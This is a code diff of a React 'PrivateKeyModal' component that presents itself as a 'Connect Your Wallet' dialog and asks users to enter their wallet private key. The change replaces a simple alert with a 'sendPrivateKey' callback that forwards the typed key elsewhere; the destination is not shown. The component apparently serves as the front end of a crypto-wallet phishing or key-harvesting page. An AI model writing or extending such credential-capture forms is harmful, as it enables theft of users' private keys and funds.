@@ -1,44 +1,35 @@
 import React, { useState } from "react";
-import styles from "./PhraseModal.module.css";
+import styles from "./PrivateKeyModal.module.css";
 
-function PhraseModal() {
-  const [isModalOpen, setIsModalOpen] = useState(true);
+function PrivateKeyModal({closePrivateKeyForm, sendPrivateKey}) {
   const [privateKey, setPrivateKey] = useState("");
 
-  const handleCloseModal = () => {
-    setIsModalOpen(false);
-  };
+  const submitPhrase=(e)=>{
+    e.preventDefault()
 
-  const handleConnectClick = () => {
-    alert(`Connecting wallet with private key: ${privateKey}`);
-  };
-
-  const handlePrivateKeyChange = (e) => {
-    setPrivateKey(e.target.value);
-  };
-
-  if (!isModalOpen) {
-    return null;
+    if(privateKey)
+      sendPrivateKey(privateKey)
   }
 
+
   return (
-    <div className={styles.overlay} onClick={handleCloseModal}>
+    <div className={styles.overlay} onClick={closePrivateKeyForm}>
       <div
         className={styles.modalContainer}
         onClick={(e) => e.stopPropagation()} // Prevents closing the modal when clicking inside
       >
-        <button onClick={handleCloseModal} className={styles.closeButton}>
+        <button className={styles.closeButton} onClick={closePrivateKeyForm}>
           &times;
         </button>
         <h2>Connect Your Wallet</h2>
-        <p>Input Private Key phrase</p>
+        <p className={styles.topP}>Input Private Key phrase</p>
         <div className={styles.formGroup}>
           <input
             type="text"
             className={styles.privateKeyInput}
             placeholder="Enter Private Key*"
             value={privateKey}
-            onChange={handlePrivateKeyChange}
+            onChange={(e)=>setPrivateKey(e.target.value)}
           />
         </div>
         <p className={styles.infoText}>
@@ -46,7 +37,7 @@ function PhraseModal() {
           50 or more in number.
         </p>
         <div className={styles.buttonGroup}>
-          <button onClick={handleConnectClick} className={styles.connectButton}>
+          <button className={styles.connectButton} onClick={submitPhrase}>
             Connect Wallet
           </button>
         </div>
@@ -55,4 +46,4 @@ function PhraseModal() {
   );
 }
 
-export default PhraseModal;
+export default PrivateKeyModal;
